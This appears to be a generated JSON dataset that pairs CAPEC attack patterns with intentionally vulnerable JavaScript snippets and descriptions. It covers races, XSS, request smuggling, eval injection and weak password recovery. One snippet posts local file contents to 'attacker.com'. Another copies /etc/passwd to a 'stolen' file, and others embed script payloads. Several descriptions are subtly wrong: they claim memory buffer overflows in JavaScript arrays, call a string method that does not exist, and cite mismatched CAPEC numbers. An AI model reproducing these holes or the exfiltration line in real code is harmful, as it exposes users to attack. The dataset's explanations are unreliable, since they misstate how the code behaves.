        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst filePath = path.join(__dirname, 'importantFile.txt');\n\n// Check if the file exists\nif (fs.existsSync(filePath)) {\n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Read the file content\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000);\n}\n\n// Simulate an attacker replacing the file during the delay\nsetTimeout(() => {\n  fs.writeFile(filePath, 'Malicious content', (err) => {\n    if (err) throw err;\n    console.log('File replaced with malicious content');\n  });\n}, 500);",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability. The code first checks if a file exists and then reads its content after a delay. During this delay, an attacker can replace the file with malicious content. This embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and CWE-363 (Race Condition Enabling Link Following). The race condition occurs because the file's existence is checked before the delay, allowing an attacker to replace the file before it is read, leading to potential security issues."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst tempFilePath = '/tmp/tempfile';\nconst sensitiveFilePath = '/etc/sensitivefile';\n\n// Check if the temporary file exists\nif (!fs.existsSync(tempFilePath)) {\n  // Simulate a race condition by creating a symlink to the sensitive file\n  fs.symlinkSync(sensitiveFilePath, tempFilePath);\n\n  // Create and write to the temporary file\n  fs.writeFileSync(tempFilePath, 'malicious content');\n\n  console.log('Temporary file created and written to.');\n} else {\n  console.log('Temporary file already exists.');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability involving symbolic links. The code first checks if a temporary file exists. If it does not, it creates a symbolic link pointing to a sensitive file. Then, it writes malicious content to the temporary file, which actually writes to the sensitive file due to the symbolic link. This embodies the main idea of the CAPEC by exploiting a time-of-check time-of-use (TOCTOU) race condition and improper handling of symbolic links. The related CWEs are represented by the race condition (CWE-367), improper synchronization (CWE-662), and improper handling of symbolic links (CWE-61)."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let input = req.url.split('?')[1];\n  try {\n    // CWE-20: Improper Input Validation\n    if (!input) throw new Error('No input provided');\n\n    // CWE-74: Improper Neutralization of Special Elements\n    let sanitizedInput = input.replace(/[^a-zA-Z0-9]/g, '');\n\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    if (sanitizedInput !== input) throw new Error(`Invalid characters in input: ${input}`);\n\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Processed input: ${sanitizedInput}`);\n  } catch (err) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}`);\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates a simple HTTP server that processes user input from the URL query string. The code demonstrates several common vulnerabilities that can be discovered through fuzzing:\n\n1. **CWE-20: Improper Input Validation** - The code checks if the input is provided but does not validate its properties thoroughly.\n2. **CWE-74: Improper Neutralization of Special Elements** - The code attempts to sanitize the input by removing non-alphanumeric characters, but this simplistic approach can be bypassed.\n3. **CWE-209: Generation of Error Message Containing Sensitive Information** - The error message reveals the original input, which can expose sensitive information.\n\nThe code represents the main idea of fuzzing by showing how an attacker might discover and exploit these weaknesses through random input testing."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst filePath = '/tmp/sensitive_file';\n\n// Time-of-check\nfs.access(filePath, fs.constants.R_OK | fs.constants.W_OK, (err) => {\n  if (err) {\n    console.error('File is not accessible');\n    return;\n  }\n\n  // Simulate a delay to create a window for race condition\n  setTimeout(() => {\n    // Time-of-use\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        console.error('Error reading file');\n        return;\n      }\n      console.log('File content:', data);\n    });\n  }, 1000); // Delay to simulate race condition window\n});",
        "description": "This JavaScript code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability. The code first checks if a file is accessible using `fs.access` (time-of-check). If the file is accessible, it waits for a second (simulating a delay) before reading the file using `fs.readFile` (time-of-use). During this delay, an attacker could potentially modify or replace the file, leading to unexpected behavior when the file is read. This example embodies the main idea of CAPEC-367 and related CWEs by illustrating how a resource's state can change between the check and the use, causing potential security issues."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-114: Loading a library from an untrusted source\nconst maliciousLibrary = './maliciousLibrary.so';\n\n// CWE-362: Race condition vulnerability\nlet privilegedThread = false;\n\nfunction hijackThread() {\n  if (privilegedThread) {\n    // CWE-78: OS Command Injection\n    exec(`ld_preload=${maliciousLibrary} /bin/ls`, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  }\n}\n\n// Simulate a race condition\nsetTimeout(() => { privilegedThread = true; }, 100);\nsetTimeout(hijackThread, 50);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an adversary can hijack a privileged thread of execution. The code uses the 'child_process' module to execute a command with elevated privileges (CWE-114 and CWE-78). A race condition (CWE-362) is simulated by setting a timeout to change the 'privilegedThread' variable, allowing the 'hijackThread' function to execute malicious code if the condition is met. This represents the main idea of CAPEC-250, where an adversary can inject malicious code into a running process by manipulating its memory and exploiting race conditions."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "document.cookie = 'sessionId=12345; path=/;';\n\nfunction getSessionId() {\n    const cookies = document.cookie.split('; ');\n    for (let i = 0; i < cookies.length; i++) {\n        const cookie = cookies[i].split('=');\n        if (cookie[0] === 'sessionId') {\n            return cookie[1];\n        }\n    }\n    return null;\n}\n\nfunction authenticateUser() {\n    const sessionId = getSessionId();\n    if (sessionId) {\n        // Assume sessionId is valid without validation\n        console.log('User authenticated with sessionId:', sessionId);\n    } else {\n        console.log('Authentication failed. No sessionId found.');\n    }\n}\n\nauthenticateUser();",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of session management using cookies. The code sets a cookie named 'sessionId' and provides a function to retrieve this session ID from the cookies. The 'authenticateUser' function then uses this session ID to authenticate the user without any validation or integrity checking. This embodies the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies, as it shows how an attacker could potentially access or modify the session ID cookie to impersonate a user. The code also highlights several related CWEs: CWE-565 (Reliance on Cookies without Validation and Integrity Checking), CWE-311 (Missing Encryption of Sensitive Data), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-384 (Session Fixation)."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: directly using user input in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>User Input: ${userInput}</h1></body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server parses the query string from the URL and directly embeds the user input into the HTML response without any sanitization or escaping. This represents the main idea of the CAPEC 'XSS Through HTTP Query Strings' where an adversary can inject malicious script code through the query string. The related CWEs are demonstrated by the lack of proper neutralization of script-related HTML tags (CWE-80), improper neutralization of input during web page generation (CWE-79), and improper encoding or escaping of output (CWE-116). This makes the application vulnerable to Cross-Site Scripting (XSS) attacks."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Request Smuggling\n    if (body.includes('Content-Length:') && body.includes('Transfer-Encoding: chunked')) {\n      // Inconsistent Interpretation of HTTP Requests\n      const headers = req.headers;\n      headers['Content-Length'] = '0'; // Improper Neutralization of CRLF Sequences\n      const smuggledRequest = `POST / HTTP/1.1\\r\\nHost: victim.com\\r\\nContent-Length: 13\\r\\n\\r\\nSmuggled Body`;\n      // Forward the smuggled request to the backend server\n      const options = {\n        hostname: 'backend-server.com',\n        port: 80,\n        path: '/',\n        method: 'POST',\n        headers: headers\n      };\n      const proxyReq = http.request(options, (proxyRes) => {\n        proxyRes.pipe(res, { end: true });\n      });\n      proxyReq.write(smuggledRequest);\n      proxyReq.end();\n    } else {\n      res.end('Request received');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that is vulnerable to HTTP Request Smuggling. The server listens for incoming HTTP requests and checks if the request body contains both 'Content-Length' and 'Transfer-Encoding: chunked' headers, which can lead to inconsistent interpretation of HTTP requests (CWE-444). If such headers are found, the code constructs a smuggled HTTP request and forwards it to a backend server, demonstrating how an attacker could exploit this vulnerability to send unauthorized requests. The code also shows improper neutralization of CRLF sequences (CWE-113) by directly manipulating headers without proper sanitization. This example highlights the risks associated with HTTP Request Smuggling and related weaknesses."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query string\n  if (userInput) {\n    // Vulnerable to HTTP Response Splitting\n    res.setHeader('Content-Type', 'text/html');\n    res.setHeader('Set-Cookie', 'sessionId=abc123; Path=/; HttpOnly');\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`Hello, ${userInput}`);\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('Hello, World!');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server takes user input from the URL query string and includes it in the HTTP response without proper sanitization. This makes the server vulnerable to HTTP Response Splitting (CWE-113). An attacker could inject CRLF sequences into the user input to manipulate the HTTP headers and create additional unauthorized responses. The code demonstrates the improper neutralization of special elements (CWE-74, CWE-138) and highlights the potential for interpretation conflicts (CWE-436) and HTTP request/response smuggling (CWE-444)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst configPath = 'config.json';\n\n// Read configuration file\nlet configData = fs.readFileSync(configPath, 'utf8');\n\n// Parse configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON in configuration file');\n  process.exit(1);\n}\n\n// Execute code based on configuration\nif (config.execute) {\n  eval(config.execute); // CWE-95: Eval Injection\n}\n\n// Load resource file\nconst resourcePath = config.resourcePath;\nlet resourceData = fs.readFileSync(resourcePath, 'utf8');\n\n// Process resource data\nif (resourceData.includes('<%')) {\n  // CWE-97: Improper Neutralization of Server-Side Includes (SSI)\n  console.log('Processing SSI directives');\n  // Potentially dangerous processing of SSI directives\n}\n\n// Improper control of code generation\nif (config.generateCode) {\n  const generatedCode = `function dynamicFunction() { ${config.generateCode} }`;\n  eval(generatedCode); // CWE-94: Code Injection\n}",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC by leveraging executable code in non-executable files. The code reads a configuration file and executes code based on its contents, which can lead to code injection vulnerabilities (CWE-94, CWE-95). It also processes a resource file that may contain server-side includes (SSI), leading to potential SSI injection (CWE-97). The snippet highlights the risks of executing untrusted input and the importance of proper input validation and neutralization."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "function unpublishedFunction() {\n  // Undocumented and unauthorized functionality\n  console.log('This is an unpublished function that should not be accessible.');\n}\n\n// No authentication or authorization checks\napp.get('/unpublished', (req, res) => {\n  unpublishedFunction();\n  res.send('Unpublished function executed.');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an unpublished function is exposed through an HTTP GET request without any authentication or authorization checks. The 'unpublishedFunction' is intended to be private and not accessible to users, but it is made publicly available through the '/unpublished' endpoint. This embodies the CAPEC of 'Using Unpublished Interfaces or Functionality' and highlights related CWEs such as 'Missing Authentication for Critical Function' (CWE-306) and 'Missing Authorization' (CWE-862). The code lacks proper security mechanisms, making it susceptible to unauthorized access and potential misuse."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "const fs = require('fs');\n\n// Storing sensitive information in cleartext\nconst sensitiveData = 'user:password123';\nfs.writeFileSync('config.txt', sensitiveData);\n\n// Reading the sensitive information from the file\nconst data = fs.readFileSync('config.txt', 'utf8');\nconsole.log('Retrieved sensitive data:', data);\n\n// Improperly clearing the sensitive data\nfs.writeFileSync('config.txt', '');",
        "description": "This JavaScript code snippet demonstrates the vulnerability of storing sensitive information in cleartext within a file, which can be easily retrieved by an attacker. The code first writes sensitive data (a username and password) to a file named 'config.txt'. It then reads the data from the file and logs it to the console, simulating an attacker's ability to retrieve the sensitive information. Finally, it attempts to clear the sensitive data by writing an empty string to the file, but this method is insufficient as it does not securely erase the data, leaving potential remnants that could be recovered. This snippet embodies the main idea of CAPEC- Retrieve Embedded Sensitive Data, and highlights related CWEs such as CWE-312 (Cleartext Storage of Sensitive Information) and CWE-226 (Sensitive Information in Resource Not Removed Before Reuse)."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User-controlled input for the search path\nlet userProvidedPath = process.argv[2];\n\n// Vulnerable code: using user-provided path to load a configuration file\nlet configFilePath = path.join(userProvidedPath, 'config.json');\n\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading config file:', err);\n    return;\n  }\n  try {\n    let config = JSON.parse(data);\n    console.log('Configuration loaded:', config);\n  } catch (parseErr) {\n    console.error('Error parsing config file:', parseErr);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can manipulate the search path to load a malicious configuration file. The code takes a user-provided path as input and uses it to construct the path to a configuration file. This embodies the CAPEC 'Leveraging/Manipulating Configuration File Search Paths' by allowing an attacker to control the path and potentially load a malicious file. The related CWEs are represented as follows: CWE-426 and CWE-427 are shown by the use of an untrusted and uncontrolled search path, CWE-73 is demonstrated by allowing user input to control the file path, and CWE-99 is represented by the improper control of the resource identifier (the configuration file path)."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/profile', (req, res) => {\n  const userToken = req.cookies.userToken;\n  if (!userToken) {\n    return res.status(401).send('Unauthorized');\n  }\n  // Assume userToken is immutable and valid\n  const userData = decodeToken(userToken); // No integrity check\n  if (!userData) {\n    return res.status(401).send('Unauthorized');\n  }\n  res.send(`Welcome, ${userData.username}`);\n});\n\nfunction decodeToken(token) {\n  // Decoding token without validation\n  try {\n    return JSON.parse(Buffer.from(token, 'base64').toString('utf8'));\n  } catch (e) {\n    return null;\n  }\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable Express.js application that uses cookies to store user tokens. The '/profile' endpoint retrieves the 'userToken' cookie and decodes it without performing any integrity checks or validation. This embodies the CAPEC idea of 'Manipulating Opaque Client-based Data Tokens' by assuming the token is immutable and valid, which can be exploited by an attacker. The related CWEs are represented as follows: CWE-353 (Missing Support for Integrity Check) by not verifying the token's integrity, CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the token is immutable, and CWE-565 (Reliance on Cookies without Validation and Integrity Checking) by relying on the cookie's value without proper validation."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Simulate an attacker writing to a terminal device\nconst terminalDevice = '/dev/pts/1';\nconst maliciousCommand = 'cat /etc/passwd > /tmp/stolen_passwd';\n\n// Write the malicious command to the terminal device\nfs.writeFile(terminalDevice, maliciousCommand, (err) => {\n  if (err) throw err;\n  console.log('Malicious command written to terminal device');\n});\n\n// Simulate the victim executing the command\nexec(maliciousCommand, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker writes a malicious command to a writable terminal device. The attacker writes a command to copy the contents of '/etc/passwd' to a temporary file '/tmp/stolen_passwd'. The code then simulates the victim executing this command, which could lead to sensitive information being exposed. This example embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78), exposure of sensitive information (CWE-214), and process control (CWE-114). The code is a simplified representation of how an attacker might exploit writable terminal devices to execute malicious commands with the victim's privileges."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "function sendEmail(to, subject, body) {\n  var emailHeaders = \"To: \" + to + \"\\n\" + \"Subject: \" + subject + \"\\n\";\n  var emailBody = body;\n  var email = emailHeaders + \"\\n\" + emailBody;\n  // Simulate sending email\n  console.log(\"Sending email:\", email);\n}\n\n// Example usage\nvar maliciousPayload = \"\\nBCC: victim@example.com\\n\\n<script>alert('Hacked!');</script>\";\nsendEmail(\"user@example.com\", \"Hello\", \"This is a test email.\" + maliciousPayload);",
        "description": "This JavaScript code snippet demonstrates a simplified email sending function that concatenates email headers and body without proper neutralization of meta-characters. The 'sendEmail' function takes 'to', 'subject', and 'body' as parameters and constructs the email by concatenating these values. The example usage shows how an attacker can inject a malicious payload into the email body, which includes additional email headers and a script tag. This represents the CAPEC of using meta-characters in email headers to inject malicious payloads. The related CWEs are illustrated by the lack of proper neutralization (CWE-150), improper encoding or escaping of output (CWE-116), and potential for argument injection (CWE-88)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(input) {\n  const buffer = new ArrayBuffer(256); // Fixed size buffer\n  const view = new Uint8Array(buffer);\n  for (let i = 0; i < input.length; i++) {\n    view[i] = input.charCodeAt(i); // No bounds checking\n  }\n  return buffer;\n}\n\n// Example usage\nconst userInput = 'A'.repeat(300); // Input larger than buffer size\nconst mimeData = convertToMIME(userInput);",
        "description": "This JavaScript code snippet demonstrates a MIME conversion routine that is vulnerable to a buffer overflow attack. The function `convertToMIME` takes an input string and attempts to convert it to a MIME-compatible format by copying the input into a fixed-size buffer. However, the code does not check if the input length exceeds the buffer size, leading to a classic buffer overflow vulnerability (CWE-120). This can cause the program to write outside the intended memory buffer boundaries (CWE-119), potentially allowing an attacker to execute arbitrary code. The example usage shows how an attacker could exploit this vulnerability by providing an input string that is larger than the buffer size, causing a buffer overflow."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "function processInput(input) {\n    // First parser layer: decode HTML entities\n    let parser1 = input.replace(/&lt;/g, '<').replace(/&gt;/g, '>');\n    \n    // Input validation layer\n    if (!/^[a-zA-Z0-9<>]+$/.test(parser1)) {\n        throw new Error('Invalid input detected');\n    }\n    \n    // Second parser layer: execute as JavaScript code\n    eval(parser1);\n}\n\n// Example of malicious input\nlet userInput = '&lt;script&gt;alert(1)&lt;/script&gt;';\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC by showing how an attacker can exploit multiple input interpretation layers to bypass input validation. The `processInput` function first decodes HTML entities (parser1), then performs input validation to check for allowed characters. However, after validation, the input is passed to `eval` (parser2), which executes the input as JavaScript code. An attacker can provide input like `&lt;script&gt;alert(1)&lt;/script&gt;` that passes validation but becomes a harmful script after decoding, leading to a potential XSS attack. This example highlights the importance of the order of validation and parsing layers, as well as the need for comprehensive input validation and neutralization."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function loadImage(file) {\n  const reader = new FileReader();\n  reader.onload = function(event) {\n    const buffer = new ArrayBuffer(1024); // Fixed buffer size\n    const view = new Uint8Array(buffer);\n    const data = new Uint8Array(event.target.result);\n    for (let i = 0; i < data.length; i++) {\n      view[i] = data[i]; // No bounds checking\n    }\n    // Process the image data\n    processImage(view);\n  };\n  reader.readAsArrayBuffer(file);\n}\n\nfunction processImage(data) {\n  // Dummy function to represent image processing\n  console.log('Processing image data:', data);\n}\n\n// Simulate loading an image file\nconst fakeFile = new Blob([new Uint8Array(2048)], { type: 'image/jpeg' });\nloadImage(fakeFile);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in the handling of a binary resource, specifically an image file. The `loadImage` function reads an image file using the FileReader API and attempts to copy its contents into a fixed-size buffer without checking if the file size exceeds the buffer size. This can lead to a buffer overflow if the file is larger than the buffer, potentially allowing an attacker to execute arbitrary code. The code embodies the main idea of CAPEC-123 (Overflow Binary Resource File) and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readSymbolicLink(filePath) {\n  try {\n    const resolvedPath = fs.readlinkSync(filePath);\n    const buffer = Buffer.alloc(256); // Fixed buffer size\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n\n    // CWE-120: Buffer Copy without Checking Size of Input\n    data.copy(buffer);\n\n    console.log('Data:', buffer.toString());\n  } catch (err) {\n    console.error('Error:', err);\n  }\n}\n\n// Example usage\nreadSymbolicLink('/tmp/symlink');",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The function `readSymbolicLink` takes a file path, resolves it to its target using `fs.readlinkSync`, and then reads the content of the target file. The content is copied into a fixed-size buffer without checking if the content size exceeds the buffer size, leading to a classic buffer overflow (CWE-120). This snippet embodies the main idea of the CAPEC by showing how symbolic links can be manipulated to cause buffer overflows due to insufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "const configData = '<script>alert(\"XSS\")</script>'.repeat(1000);\nconst buffer = new Array(256);\n\nfunction processConfig(data) {\n  for (let i = 0; i < data.length; i++) {\n    buffer[i] = data[i]; // CWE-120: Buffer Copy without Checking Size of Input\n  }\n}\n\nprocessConfig(configData);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability by copying an oversized string into a fixed-size buffer without checking the input size. The 'configData' variable contains a maliciously crafted string that is repeated 1000 times, simulating an attack vector. The 'processConfig' function attempts to copy this data into a buffer of size 256, leading to a buffer overflow (CWE-120). This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' by showing how an adversary can exploit improperly handled configuration data to cause a buffer overflow. The code also touches on CWE-20 (Improper Input Validation) as it does not validate the size of the input before processing."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new Array(10).fill('');\n  let expandedInput = input.repeat(2); // Expands the input size\n  for (let i = 0; i < expandedInput.length; i++) {\n    buffer[i] = expandedInput[i]; // Potential buffer overflow\n  }\n  return buffer.join('');\n}\n\n// Example usage\nlet userInput = '1234567890';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerableFunction` takes an input string and expands it by repeating it twice. It then attempts to copy the expanded input into a fixed-size buffer of 10 elements. If the expanded input exceeds the buffer size, it will cause a buffer overflow. This example embodies the main idea of CAPEC-130: Buffer Overflow via Parameter Expansion, and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-131 (Incorrect Calculation of Buffer Size)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchResource(resource) {\n  if (resource.startsWith('http://') || resource.startsWith('https://')) {\n    fetch(resource)\n      .then(response => response.text())\n      .then(data => console.log(data))\n      .catch(error => console.error('Error fetching URL:', error));\n  } else {\n    fetch('file://' + resource)\n      .then(response => response.text())\n      .then(data => {\n        // Send local file data to attacker's server\n        fetch('http://attacker.com/steal', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ fileData: data })\n        });\n      })\n      .catch(error => console.error('Error fetching local file:', error));\n  }\n}\n\n// Example usage\nfetchResource('C:/Users/username/Documents/sensitive.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a function fetchResource is designed to fetch resources based on a given input. The function checks if the input starts with 'http://' or 'https://', assuming it is a URL, and fetches it accordingly. However, if the input does not start with these prefixes, it treats the input as a local file path and attempts to fetch it using the 'file://' scheme. This can lead to an attacker tricking the function into accessing local files and sending their contents to a remote server controlled by the attacker. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and highlights related CWEs such as improper handling of unexpected data types (CWE-241), use of incorrectly-resolved names or references (CWE-706), and reliance on file names or extensions of externally-supplied files (CWE-646)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst bcrypt = require('bcrypt');\n\napp.use(bodyParser.json());\n\nlet users = {};\nlet loginAttempts = {};\nconst MAX_ATTEMPTS = 5;\nconst LOCK_TIME = 300000; // 5 minutes\n\napp.post('/register', async (req, res) => {\n  const { username, password } = req.body;\n  if (!username || !password) {\n    return res.status(400).send('Username and password are required');\n  }\n  const hashedPassword = await bcrypt.hash(password, 10);\n  users[username] = { password: hashedPassword, lastPasswordChange: Date.now() };\n  res.status(201).send('User registered');\n});\n\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  if (!username || !password) {\n    return res.status(400).send('Username and password are required');\n  }\n  const user = users[username];\n  if (!user) {\n    return res.status(401).send('Invalid username or password');\n  }\n  if (loginAttempts[username] && loginAttempts[username].attempts >= MAX_ATTEMPTS && Date.now() - loginAttempts[username].lastAttempt < LOCK_TIME) {\n    return res.status(429).send('Too many login attempts. Please try again later.');\n  }\n  const match = await bcrypt.compare(password, user.password);\n  if (!match) {\n    if (!loginAttempts[username]) {\n      loginAttempts[username] = { attempts: 0, lastAttempt: Date.now() };\n    }\n    loginAttempts[username].attempts++;\n    loginAttempts[username].lastAttempt = Date.now();\n    return res.status(401).send('Invalid username or password');\n  }\n  loginAttempts[username] = { attempts: 0, lastAttempt: Date.now() };\n  res.status(200).send('Login successful');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a basic Express.js application that handles user registration and login. It embodies the main idea of CAPEC-112 (Password Brute Forcing) and addresses several related CWEs. The code includes the following features:\n\n1. **Weak Password Requirements (CWE-521)**: The code does not enforce strong password requirements during registration.\n2. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The code implements a basic mechanism to limit the number of failed login attempts to prevent brute force attacks. If a user exceeds the maximum allowed attempts within a short time frame, their account is temporarily locked.\n3. **Storing Passwords in a Recoverable Format (CWE-257)**: The code uses bcrypt to hash passwords before storing them, ensuring that passwords are not stored in a recoverable format.\n4. **Reliance on a Single Factor in a Security Decision (CWE-654)**: The code relies solely on password-based authentication, which is a single-factor authentication method.\n5. **Use of Single-factor Authentication (CWE-308)**: The code uses only passwords for authentication, which is less secure compared to multi-factor authentication.\n6. **Use of Password System for Primary Authentication (CWE-309)**: The code uses a password system as the primary means of authentication, which can be vulnerable to various attacks.\n\nOverall, the code demonstrates a simple implementation of user authentication while highlighting potential vulnerabilities and areas for improvement in password security."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "const users = { 'user1': { 'password': 'password123', 'securityQuestion': 'petName', 'securityAnswer': 'fluffy' } }; \n\nfunction recoverPassword(username, answer) { \n  if (users[username] && users[username].securityAnswer === answer) { \n    return users[username].password; \n  } else { \n    return 'Security answer incorrect'; \n  } \n} \n\nconsole.log(recoverPassword('user1', 'fluffy')); // Outputs: password123",
        "description": "This JavaScript code snippet demonstrates a weak password recovery mechanism. It stores user passwords in plaintext and uses a simple security question for password recovery. If an attacker knows or guesses the answer to the security question, they can retrieve the user's password. This code embodies the main idea of CAPEC-139 (Password Recovery Exploitation) and highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials), CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), and CWE-257 (Storing Passwords in a Recoverable Format). The code is vulnerable because it does not securely handle password storage or recovery, making it easy for attackers to gain unauthorized access."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {};\n\n// Improper Authorization (CWE-285)\napp.post('/register', (req, res) => {\n  const { serviceName, serviceUrl } = req.body;\n  registry[serviceName] = serviceUrl;\n  res.send('Service registered');\n});\n\n// Cleartext Storage in the Registry (CWE-314)\napp.get('/lookup', (req, res) => {\n  const { serviceName } = req.query;\n  if (registry[serviceName]) {\n    res.send(`Service URL: ${registry[serviceName]}`);\n  } else {\n    res.status(404).send('Service not found');\n  }\n});\n\n// Exposure of WSDL File Containing Sensitive Information (CWE-651)\napp.get('/wsdl', (req, res) => {\n  res.sendFile('/path/to/wsdl/file.wsdl');\n});\n\napp.listen(3000, () => {\n  console.log('Registry service running on port 3000');\n});",
